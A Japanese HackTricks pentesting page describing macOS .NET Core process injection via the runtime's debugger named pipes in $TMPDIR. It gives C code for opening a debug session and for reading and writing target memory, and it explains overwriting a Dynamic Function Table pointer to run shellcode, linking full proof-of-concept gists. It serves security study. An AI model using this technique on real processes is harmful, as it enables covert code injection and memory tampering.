# macOS .Net アプリケーションインジェクション

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ会社**で働いていますか？**HackTricksで会社の広告を掲載**したいですか？または、**最新版のPEASSを入手**したり、HackTricksを**PDFでダウンロード**したいですか？[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください。
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをご覧ください。
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手してください。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加するか**、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
* **ハッキングのコツを共有するために、**[**hacktricksリポジトリ**](https://github.com/carlospolop/hacktricks)と[**hacktricks-cloudリポジトリ**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出してください。**

</details>

## .NET Core デバッグ <a href="#net-core-debugging" id="net-core-debugging"></a>

### **デバッグセッションの確立** <a href="#net-core-debugging" id="net-core-debugging"></a>

[**dbgtransportsession.cpp**](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/shared/dbgtransportsession.cpp)はデバッガーとデバッギーの**通信**を処理します。
それは[dbgtransportsession.cpp#L127](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/shared/dbgtransportsession.cpp#L127)で[twowaypipe.cpp#L27](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/debug-pal/unix/twowaypipe.cpp#L27)を呼び出すことにより、.Netプロセスごとに2つの名前付きパイプを作成します（一方は**`-in`**で終わり、もう一方は**`-out`**で終わり、残りの名前は同じになります）。

したがって、ユーザーの**`$TMPDIR`**に行くと、.Netアプリケーションをデバッグするために使用できる**デバッグFIFO**を見つけることができます：

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

関数[**DbgTransportSession::TransportWorker**](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/shared/dbgtransportsession.cpp#L1259)はデバッガーからの通信を処理します。

デバッガーが最初に行う必要があることは、**新しいデバッグセッションを作成する**ことです。これは、`MessageHeader`構造体で始まる**`out`パイプ経由でメッセージを送信する**ことによって行われます。この構造体は.NETのソースから取得できます：
```c
struct MessageHeader
{
MessageType   m_eType;        // Type of message this is
DWORD         m_cbDataBlock;  // Size of data block that immediately follows this header (can be zero)
DWORD         m_dwId;         // Message ID assigned by the sender of this message
DWORD         m_dwReplyId;    // Message ID that this is a reply to (used by messages such as MT_GetDCB)
DWORD         m_dwLastSeenId; // Message ID last seen by sender (receiver can discard up to here from send queue)
DWORD         m_dwReserved;   // Reserved for future expansion (must be initialized to zero and
// never read)
union {
struct {
DWORD         m_dwMajorVersion;   // Protocol version requested/accepted
DWORD         m_dwMinorVersion;
} VersionInfo;
...
} TypeSpecificData;

BYTE                    m_sMustBeZero[8];
}
```
新しいセッションリクエストの場合、この構造体は以下のように設定されます：
```c
static const DWORD kCurrentMajorVersion = 2;
static const DWORD kCurrentMinorVersion = 0;

// Set the message type (in this case, we're establishing a session)
sSendHeader.m_eType = MT_SessionRequest;

// Set the version
sSendHeader.TypeSpecificData.VersionInfo.m_dwMajorVersion = kCurrentMajorVersion;
sSendHeader.TypeSpecificData.VersionInfo.m_dwMinorVersion = kCurrentMinorVersion;

// Finally set the number of bytes which follow this header
sSendHeader.m_cbDataBlock = sizeof(SessionRequestData);
```
構築したら、`write` システムコールを使用して**ターゲットに送信します**：
```c
write(wr, &sSendHeader, sizeof(MessageHeader));
```
ヘッダーに続いて、セッションを識別するGUIDを含む`sessionRequestData`構造体を送信する必要があります：
```c
// All '9' is a GUID.. right??
memset(&sDataBlock.m_sSessionID, 9, sizeof(SessionRequestData));

// Send over the session request data
write(wr, &sDataBlock, sizeof(SessionRequestData));
```
送信セッションリクエスト後、`out` パイプからヘッダーを**読み取ります**。これにより、デバッガーセッションを確立するリクエストが**成功したかどうか**が示されます。
```c
read(rd, &sReceiveHeader, sizeof(MessageHeader));
```
### メモリの読み取り

デバッグセッションが確立されると、[`MT_ReadMemory`](https://github.com/dotnet/runtime/blob/f3a45a91441cf938765bafc795cbf4885cad8800/src/coreclr/src/debug/shared/dbgtransportsession.cpp#L1896) メッセージタイプを使用して**メモリを読み取る**ことが可能です。メモリを読み取るために必要な主なコードは以下の通りです：
```c
bool readMemory(void *addr, int len, unsigned char **output) {

*output = (unsigned char *)malloc(len);
if (*output == NULL) {
return false;
}

sSendHeader.m_dwId++; // We increment this for each request
sSendHeader.m_dwLastSeenId = sReceiveHeader.m_dwId; // This needs to be set to the ID of our previous response
sSendHeader.m_dwReplyId = sReceiveHeader.m_dwId; // Similar to above, this indicates which ID we are responding to
sSendHeader.m_eType = MT_ReadMemory; // The type of request we are making
sSendHeader.TypeSpecificData.MemoryAccess.m_pbLeftSideBuffer = (PBYTE)addr; // Address to read from
sSendHeader.TypeSpecificData.MemoryAccess.m_cbLeftSideBuffer = len; // Number of bytes to write
sSendHeader.m_cbDataBlock = 0;

// Write the header
if (write(wr, &sSendHeader, sizeof(sSendHeader)) < 0) {
return false;
}

// Read the response header
if (read(rd, &sReceiveHeader, sizeof(sSendHeader)) < 0) {
return false;
}

// Make sure that memory could be read before we attempt to read further
if (sReceiveHeader.TypeSpecificData.MemoryAccess.m_hrResult != 0) {
return false;
}

memset(*output, 0, len);

// Read the memory from the debugee
if (read(rd, *output, sReceiveHeader.m_cbDataBlock) < 0) {
return false;
}

return true;
}
```
プルーフ オブ コンセプト（POC）コードは[こちら](https://gist.github.com/xpn/95eefc14918998853f6e0ab48d9f7b0b)で見つかります。

### メモリ書き込み
```c
bool writeMemory(void *addr, int len, unsigned char *input) {

sSendHeader.m_dwId++; // We increment this for each request
sSendHeader.m_dwLastSeenId = sReceiveHeader.m_dwId; // This needs to be set to the ID of our previous response
sSendHeader.m_dwReplyId = sReceiveHeader.m_dwId; // Similar to above, this indicates which ID we are responding to
sSendHeader.m_eType = MT_WriteMemory; // The type of request we are making
sSendHeader.TypeSpecificData.MemoryAccess.m_pbLeftSideBuffer = (PBYTE)addr; // Address to write to
sSendHeader.TypeSpecificData.MemoryAccess.m_cbLeftSideBuffer = len; // Number of bytes to write
sSendHeader.m_cbDataBlock = len;

// Write the header
if (write(wr, &sSendHeader, sizeof(sSendHeader)) < 0) {
return false;
}

// Write the data
if (write(wr, input, len) < 0) {
return false;
}

// Read the response header
if (read(rd, &sReceiveHeader, sizeof(sSendHeader)) < 0) {
return false;
}

// Ensure our memory write was successful
if (sReceiveHeader.TypeSpecificData.MemoryAccess.m_hrResult != 0) {
return false;
}

return true;

}
```
POCコードは[こちら](https://gist.github.com/xpn/7c3040a7398808747e158a25745380a5)で見つけることができます。

### .NET Core コード実行 <a href="#net-core-code-execution" id="net-core-code-execution"></a>

まず最初に行うべきことは、例えば実行するシェルコードを保存するために **`rwx`** 権限を持つメモリ領域を特定することです。これは簡単に行うことができます：
```bash
vmmap -pages [pid]
vmmap -pages 35829 | grep "rwx/rwx"
```
実行をトリガーするためには、関数ポインタが格納されている場所を知って、それを上書きする必要があります。**Dynamic Function Table (DFT)** 内のポインタを上書きすることが可能で、これは .NET Core ランタイムが JIT コンパイルのためのヘルパー関数を提供するために使用します。サポートされている関数ポインタのリストは [`jithelpers.h`](https://github.com/dotnet/runtime/blob/6072e4d3a7a2a1493f514cdf4be75a3d56580e84/src/coreclr/src/inc/jithelpers.h) 内で見つけることができます。

x64 バージョンでは、**`libcorclr.dll`** 内でシンボル **`_hlpDynamicFuncTable`** への参照を探すために、mimikatz風の **signature hunting** 技術を使って直接行うことができます。これを参照解除することができます：

<figure><img src="../../../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>

残された作業は、シグネチャ検索を開始するアドレスを見つけることです。これを行うために、別の露出したデバッガー関数 **`MT_GetDCB`** を利用します。これはターゲットプロセスに関する多くの有用な情報を返しますが、私たちのケースでは、**ヘルパー関数のアドレス**、**`m_helperRemoteStartAddr`** を含むフィールドに興味があります。このアドレスを使用して、ターゲットプロセスメモリ内で **`libcorclr.dll`** がどこに位置しているかを知り、DFTの検索を開始することができます。

このアドレスを知っていれば、関数ポインタを私たちのシェルコードのもので上書きすることが可能です。

PowerShellにインジェクトするために使用された完全なPOCコードは[ここ](https://gist.github.com/xpn/b427998c8b3924ab1d63c89d273734b6)で見つけることができます。

## 参考文献

* この技術は [https://blog.xpnsec.com/macos-injection-via-third-party-frameworks/](https://blog.xpnsec.com/macos-injection-via-third-party-frameworks/) から取られました。

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ会社**で働いていますか？ **HackTricks** であなたの**会社を広告**したいですか？または、**最新のPEASSバージョンを入手**したり、**HackTricksをPDFでダウンロード**したいですか？ [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) を発見してください。これは私たちの独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) のコレクションです。
* [**公式のPEASS & HackTricksグッズ**](https://peass.creator-spring.com) を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加するか**、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**に**フォローしてください。
* **hacktricksリポジトリ**と**hacktricks-cloudリポジトリ**にPRを提出して、あなたのハッキングのコツを共有してください。

</details>
